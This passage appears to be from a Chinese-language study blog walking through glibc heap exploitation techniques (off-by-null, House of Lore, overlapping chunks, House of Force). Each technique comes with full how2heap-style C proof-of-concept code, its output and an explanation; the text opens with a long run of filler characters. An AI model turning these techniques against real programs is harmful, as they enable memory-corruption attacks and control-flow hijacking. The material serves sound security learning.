content:DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDThanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique. 这里的漏洞很简单，就是off-by-null，通过a溢出了一字节到已经被释放了的b，使得b的chunk_size被改变。这里需要注意的是，新版本glibc增加了检验机制，如果chunksize(P) != prev_size (next_chunk(P))则会报错，那么如何绕过呢？ 我们知道P是指chunk指针，也就是b-0x10，那么b-0x8就是这里的chunksize(P)，被off-by-null后变成0x200。而next_chunk(P)则为b-0x10+0x200 = b+0x1f0。所以prev_size(next_chunk(P))实际上就是*(b+0x1f0)。那么我们提前修改b+0x1f0 = 0x200既绕过了验证。 随后申请了0x100的b1，位于原来b的位置上，这时原本应该更新的是c的prev_size，但是由于我们刚才说的prev_size(next_chunk(P))等于*(b+0x1f0)，实际上被更新的位置是b+0x1f0，也就是c.prev_size - 0x10。换句话说，c依然认为它前面的块的大小是0x210。 于是我们在b1下面申请0x80的b2，尽管它被夹在b1和c中间，当我们释放b1和c时两者依旧会合并，但我们依然控制着b2指针！这个时候申请0x300的d，它还是会被放到b1的位置，那么通过d就可以完全控制b2这个chunk。 house_of_lore源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111/*Advanced exploitation of the House of Lore - Malloc Maleficarum.This PoC take care also of the glibc hardening of smallbin corruption.[ ... ]else { bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)){ errstr = &quot;malloc(): smallbin double linked list corrupted&quot;; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; [ ... ]*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void jackpot(){ puts(&quot;Nice jump d00d&quot;); exit(0); }int main(int argc, char * argv[]){ intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[3] = {0}; fprintf(stderr, &quot;\\nWelcome to the House of Lore\\n&quot;); fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n&quot;); fprintf(stderr, &quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\\n\\n&quot;); fprintf(stderr, &quot;Allocating the victim chunk\\n&quot;); intptr_t *victim = malloc(100); fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\\n&quot;, victim); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t *victim_chunk = victim-2; fprintf(stderr, &quot;stack_buffer_1 at %p\\n&quot;, (void*)stack_buffer_1); fprintf(stderr, &quot;stack_buffer_2 at %p\\n&quot;, (void*)stack_buffer_2); fprintf(stderr, &quot;Create a fake chunk on the stack\\n&quot;); fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot; &quot;in second to the last malloc, which putting stack address on smallbin list\\n&quot;); stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot; &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot; &quot;chunk on stack&quot;); stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot; &quot;the small one during the free()\\n&quot;); void *p5 = malloc(1000); fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\\n&quot;, p5); fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\\n&quot;, victim); free((void*)victim); fprintf(stderr, &quot;\\nIn the unsorted bin the victim's fwd and bk pointers are nil\\n&quot;); fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]); fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]); fprintf(stderr, &quot;Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n&quot;); fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\\n&quot;, victim); void *p2 = malloc(1200); fprintf(stderr, &quot;The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n&quot;, p2); fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\\n&quot;); fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]); fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]); //------------VULNERABILITY----------- fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;); victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\\n&quot;); fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n&quot;); void *p3 = malloc(100); fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;); char *p4 = malloc(100); fprintf(stderr, &quot;p4 = malloc(100)\\n&quot;); fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;, stack_buffer_2[2]); fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4); // this chunk will be allocated on stack intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary} 输出： 1234567891011121314151617181920212223242526272829303132333435Welcome to the House of LoreThis is a revisited version that bypass also the hardening check introduced by glibc mallocThis is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23Allocating the victim chunkAllocated the first small chunk on the heap at 0x2006010stack_buffer_1 at 0x7ffd3c0b7460stack_buffer_2 at 0x7ffd3c0b7440Create a fake chunk on the stackSet the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin listSet the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()Allocated the large chunk on the heap at 0x2006080Freeing the chunk 0x2006010, it will be inserted in the unsorted binIn the unsorted bin the victim's fwd and bk pointers are nilvictim-&gt;fwd: (nil)victim-&gt;bk: (nil)Now performing a malloc that can't be handled by the UnsortedBin, nor the small binThis means that the chunk 0x2006010 will be inserted in front of the SmallBinThe chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x2006470The victim chunk has been sorted and its fwd and bk pointers updatedvictim-&gt;fwd: 0x7fddc3aecbd8victim-&gt;bk: 0x7fddc3aecbd8Now emulating a vulnerability that can overwrite the victim-&gt;bk pointerNow allocating a chunk with size equal to the first one freedThis should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointerThis last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bkp4 = malloc(100)The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fddc3aecbd8p4 is 0x7ffd3c0b7470 and should be on the stack!Nice jump d00d 逻辑还是比较简单的，就是通过修改栈变量以及堆上small chunkvictim的bk指针构造出一条完整的双向链表，以通过small bin检查从而使得malloc返回一个栈上地址。注意中间关键的一步是申请了一个不能被unsorted bin和small bin满足的chunk，因此只能从top chunk切割，这时原本在unsorted bin中的victim就进入了small bin。 overlapping_chunks源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475/* A simple tale of overlapping chunk. This technique is taken from http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;int main(int argc , char* argv[]){ intptr_t *p1,*p2,*p3,*p4; fprintf(stderr, &quot;\\nThis is a simple chunks overlapping problem\\n\\n&quot;); fprintf(stderr, &quot;Let's start to allocate 3 chunks on the heap\\n&quot;); p1 = malloc(0x100 - 8); p2 = malloc(0x100 - 8); p3 = malloc(0x80 - 8); fprintf(stderr, &quot;The 3 chunks have been allocated here:\\np1=%p\\np2=%p\\np3=%p\\n&quot;, p1, p2, p3); memset(p1, '1', 0x100 - 8); memset(p2, '2', 0x100 - 8); memset(p3, '3', 0x80 - 8); fprintf(stderr, &quot;\\nNow let's free the chunk p2\\n&quot;); free(p2); fprintf(stderr, &quot;The chunk p2 is now in the unsorted bin ready to serve possible\\nnew malloc() of its size\\n&quot;); fprintf(stderr, &quot;Now let's simulate an overflow that can overwrite the size of the\\nchunk freed p2.\\n&quot;); fprintf(stderr, &quot;For a toy program, the value of the last 3 bits is unimportant;&quot; &quot; however, it is best to maintain the stability of the heap.\\n&quot;); fprintf(stderr, &quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot; &quot; to assure that p1 is not mistaken for a free chunk.\\n&quot;); int evil_chunk_size = 0x181; int evil_region_size = 0x180 - 8; fprintf(stderr, &quot;We are going to set the size of chunk p2 to to %d, which gives us\\na region size of %d\\n&quot;, evil_chunk_size, evil_region_size); *(p2-1) = evil_chunk_size; // we are overwriting the &quot;size&quot; field of chunk p2 fprintf(stderr, &quot;\\nNow let's allocate another chunk with a size equal to the data\\n&quot; &quot;size of the chunk p2 injected size\\n&quot;); fprintf(stderr, &quot;This malloc will be served from the previously freed chunk that\\n&quot; &quot;is parked in the unsorted bin which size has been modified by us\\n&quot;); p4 = malloc(evil_region_size); fprintf(stderr, &quot;\\np4 has been allocated at %p and ends at %p\\n&quot;, (char *)p4, (char *)p4+evil_region_size); fprintf(stderr, &quot;p3 starts at %p and ends at %p\\n&quot;, (char *)p3, (char *)p3+0x80-8); fprintf(stderr, &quot;p4 should overlap with p3, in this case p4 includes all p3.\\n&quot;); fprintf(stderr, &quot;\\nNow everything copied inside chunk p4 can overwrites data on\\nchunk p3,&quot; &quot; and data written to chunk p3 can overwrite data\\nstored in the p4 chunk.\\n\\n&quot;); fprintf(stderr, &quot;Let's run through an example. Right now, we have:\\n&quot;); fprintf(stderr, &quot;p4 = %s\\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\\n&quot;, (char *)p3); fprintf(stderr, &quot;\\nIf we memset(p4, '4', %d), we have:\\n&quot;, evil_region_size); memset(p4, '4', evil_region_size); fprintf(stderr, &quot;p4 = %s\\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\\n&quot;, (char *)p3); fprintf(stderr, &quot;\\nAnd if we then memset(p3, '3', 80), we have:\\n&quot;); memset(p3, '3', 80); fprintf(stderr, &quot;p4 = %s\\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\\n&quot;, (char *)p3);} 输出： 123456789101112131415161718192021222324252627282930313233343536373839404142This is a simple chunks overlapping problemLet's start to allocate 3 chunks on the heapThe 3 chunks have been allocated here:p1=0x1b9a010p2=0x1b9a110p3=0x1b9a210Now let's free the chunk p2The chunk p2 is now in the unsorted bin ready to serve possiblenew malloc() of its sizeNow let's simulate an overflow that can overwrite the size of thechunk freed p2.For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.We are going to set the size of chunk p2 to to 385, which gives usa region size of 376Now let's allocate another chunk with a size equal to the datasize of the chunk p2 injected sizeThis malloc will be served from the previously freed chunk thatis parked in the unsorted bin which size has been modified by usp4 has been allocated at 0x1b9a110 and ends at 0x1b9a288p3 starts at 0x1b9a210 and ends at 0x1b9a288p4 should overlap with p3, in this case p4 includes all p3.Now everything copied inside chunk p4 can overwrites data onchunk p3, and data written to chunk p3 can overwrite datastored in the p4 chunk.Let's run through an example. Right now, we have:p4 = xK�8�p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333\u0002�If we memset(p4, '4', 376), we have:p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444\u000244444444�p3 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444\u0002�And if we then memset(p3, '3', 80), we have:p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444\u000244444444�p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444\u0002� 源程序和输出结果里已经相当清晰了，这里就是修改了一个unsorted bin中的free chunk的chunk_size，然后把它申请回来，这样它的一部分就和原本紧挨在下面的chunk重叠了，那么向它的这部分写入数据就会影响到下面的这个chunk，反之亦然。 overlapping_chunks_2源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980/* Yet another simple tale of overlapping chunk. This technique is taken from https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf. This is also referenced as Nonadjacent Free Chunk Consolidation Attack.*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main(){ intptr_t *p1,*p2,*p3,*p4,*p5,*p6; unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6; int prev_in_use = 0x1; fprintf(stderr, &quot;\\nThis is a simple chunks overlapping problem&quot;); fprintf(stderr, &quot;\\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\\n&quot;); fprintf(stderr, &quot;\\nLet's start to allocate 5 chunks on the heap:&quot;); p1 = malloc(1000); p2 = malloc(1000); p3 = malloc(1000); p4 = malloc(1000); p5 = malloc(1000); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); fprintf(stderr, &quot;\\n\\nchunk p1 from %p to %p&quot;, p1, (unsigned char *)p1+malloc_usable_size(p1)); fprintf(stderr, &quot;\\nchunk p2 from %p to %p&quot;, p2, (unsigned char *)p2+malloc_usable_size(p2)); fprintf(stderr, &quot;\\nchunk p3 from %p to %p&quot;, p3, (unsigned char *)p3+malloc_usable_size(p3)); fprintf(stderr, &quot;\\nchunk p4 from %p to %p&quot;, p4, (unsigned char *)p4+malloc_usable_size(p4)); fprintf(stderr, &quot;\\nchunk p5 from %p to %p\\n&quot;, p5, (unsigned char *)p5+malloc_usable_size(p5)); memset(p1,'A',real_size_p1); memset(p2,'B',real_size_p2); memset(p3,'C',real_size_p3); memset(p4,'D',real_size_p4); memset(p5,'E',real_size_p5); fprintf(stderr, &quot;\\nLet's free the chunk p4.\\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\\n&quot;); free(p4); fprintf(stderr, &quot;\\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\\nwith the size of chunk_p2 + size of chunk_p3\\n&quot;); *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE fprintf(stderr, &quot;\\nNow during the free() operation on p2, the allocator is fooled to think that \\nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \\n&quot;); fprintf(stderr, &quot;\\nThis operation will basically create a big free chunk that wrongly includes p3\\n&quot;); free(p2); fprintf(stderr, &quot;\\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\\n&quot;); p6 = malloc(2000); real_size_p6 = malloc_usable_size(p6); fprintf(stderr, &quot;\\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \\nwe can overwrite data in p3 by writing on chunk p6\\n&quot;); fprintf(stderr, &quot;\\nchunk p6 from %p to %p&quot;, p6, (unsigned char *)p6+real_size_p6); fprintf(stderr, &quot;\\nchunk p3 from %p to %p\\n&quot;, p3, (unsigned char *) p3+real_size_p3); fprintf(stderr, &quot;\\nData inside chunk p3: \\n\\n&quot;); fprintf(stderr, &quot;%s\\n&quot;,(char *)p3); fprintf(stderr, &quot;\\nLet's write something inside p6\\n&quot;); memset(p6,'F',1500); fprintf(stderr, &quot;\\nData inside chunk p3: \\n\\n&quot;); fprintf(stderr, &quot;%s\\n&quot;,(char *)p3);} 输出： 123456789101112131415161718192021222324252627282930313233343536373839This is a simple chunks overlapping problemThis is also referenced as Nonadjacent Free Chunk Consolidation AttackLet's start to allocate 5 chunks on the heap:chunk p1 from 0x17c9010 to 0x17c93f8chunk p2 from 0x17c9400 to 0x17c97e8chunk p3 from 0x17c97f0 to 0x17c9bd8chunk p4 from 0x17c9be0 to 0x17c9fc8chunk p5 from 0x17c9fd0 to 0x17ca3b8Let's free the chunk p4.In this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4Let's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2with the size of chunk_p2 + size of chunk_p3Now during the free() operation on p2, the allocator is fooled to think thatthe nextchunk is p4 ( since p2 + size_p2 now point to p4 )This operation will basically create a big free chunk that wrongly includes p3Now let's allocate a new chunk with a size that can be satisfied by the previously freed chunkOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping andwe can overwrite data in p3 by writing on chunk p6chunk p6 from 0x17c9400 to 0x17c9bd8chunk p3 from 0x17c97f0 to 0x17c9bd8Data inside chunk p3:CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�\u0003Let's write something inside p6Data inside chunk p3:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�\u0003 和上一个的区别在于，这次修改的是allocated chunk的chunk_size。首先申请五个大小超过fastbin范围的chunk，然后free(p4)。随后通过p1的堆溢出修改p2的chunk_size为p2与p3的chunk_size之和。这就导致在free(p2)时，分配器认为需要释放chunk_size2+chunk_size3这么大一块内存，而下一块chunk恰好是同样空闲的p4，这样就会将原本不相邻的p2和p4合并释放，中间的p3则成了最大受害者。 这时再申请一块chunk_size2+chunk_size3的chunkp6，它就和p3重叠了，控制了整块p3的数据。 house_of_force源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596/* This PoC works also with ASLR enabled. It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled. If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum ( http://phrack.org/issues/66/10.html ) Tested in Ubuntu 14.04, 64bit.*/#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[]){ fprintf(stderr, &quot;\\nWelcome to the House of Force\\n\\n&quot;); fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n&quot;); fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot; &quot;and is the chunk that will be resized when malloc asks for more space from the os.\\n&quot;); fprintf(stderr, &quot;\\nIn the end, we will use this to overwrite a variable at %p.\\n&quot;, bss_var); fprintf(stderr, &quot;Its current value is: %s\\n&quot;, bss_var); fprintf(stderr, &quot;\\nLet's allocate the first chunk, taking space from the wilderness.\\n&quot;); intptr_t *p1 = malloc(256); fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\\n&quot;, p1 - 2); fprintf(stderr, &quot;\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n&quot;); int real_size = malloc_usable_size(p1); fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n&quot;, real_size + sizeof(long)*2); fprintf(stderr, &quot;\\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\\n&quot;); //----- VULNERABILITY ---- intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); fprintf(stderr, &quot;\\nThe top chunk starts at %p\\n&quot;, ptr_top); fprintf(stderr, &quot;\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n&quot;); fprintf(stderr, &quot;Old size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1; fprintf(stderr, &quot;New size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); //------------------------ fprintf(stderr, &quot;\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n&quot; &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n&quot; &quot;overflow) and will then be able to allocate a chunk right over the desired region.\\n&quot;); /* * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata): * new_top = old_top + nb * nb = new_top - old_top * req + 2sizeof(long) = new_top - old_top * req = new_top - old_top - 2sizeof(long) * req = dest - 2sizeof(long) - old_top - 2sizeof(long) * req = dest - old_top - 4*sizeof(long) */ unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; fprintf(stderr, &quot;\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n&quot; &quot;we will malloc %#lx bytes.\\n&quot;, bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\\n&quot;, new_ptr - sizeof(long)*2); void* ctr_chunk = malloc(100); fprintf(stderr, &quot;\\nNow, the next chunk we overwrite will point at our target buffer.\\n&quot;); fprintf(stderr, &quot;malloc(100) =&gt; %p!\\n&quot;, ctr_chunk); fprintf(stderr, &quot;Now, we can finally overwrite that value:\\n&quot;); fprintf(stderr, &quot;... old string: %s\\n&quot;, bss_var); fprintf(stderr, &quot;... doing strcpy overwrite with \\&quot;YEAH!!!\\&quot;...\\n&quot;); strcpy(ctr_chunk, &quot;YEAH!!!&quot;); fprintf(stderr, &quot;... new string: %s\\n&quot;, bss_var); // some further discussion: //fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n&quot;); //fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot; // &quot;and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n&quot;); //fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n&quot;); //fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n&quot;); //fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot; // &quot;\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n&quot;); //fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\\n&quot;,p2); //fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\\n&quot;,malloc_got_address); //fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\\n&quot;);} 输出： 123456789101112131415161718192021222324252627282930313233343536Welcome to the House of ForceThe idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.In the end, we will use this to overwrite a variable at 0x602060.Its current value is: This is a string that we want to overwrite.Let's allocate the first chunk, taking space from the wilderness.The chunk of 256 bytes has been allocated at 0x13b3000.Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.Real size (aligned and all that jazz) of our allocated chunk is 280.Now let's emulate a vulnerability that can overwrite the header of the Top ChunkThe top chunk starts at 0x13b3110Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.Old size of top chunk 0x20ef1New size of top chunk 0xffffffffffffffffThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.Next, we will allocate a chunk that will get us right up against the desired region (with an integeroverflow) and will then be able to allocate a chunk right over the desired region.The value we want to write to at 0x602060, and the top chunk is at 0x13b3110, so accounting for the header size,we will malloc 0xffffffffff24ef30 bytes.As expected, the new pointer is at the same place as the old top chunk: 0x13b3110Now, the next chunk we overwrite will point at our target buffer.malloc(100) =&gt; 0x602060!Now, we can finally overwrite that value:... old string: This is a string that we want to overwrite.... doing strcpy overwrite with &quot;YEAH!!!&quot;...... new string: YEAH!!! 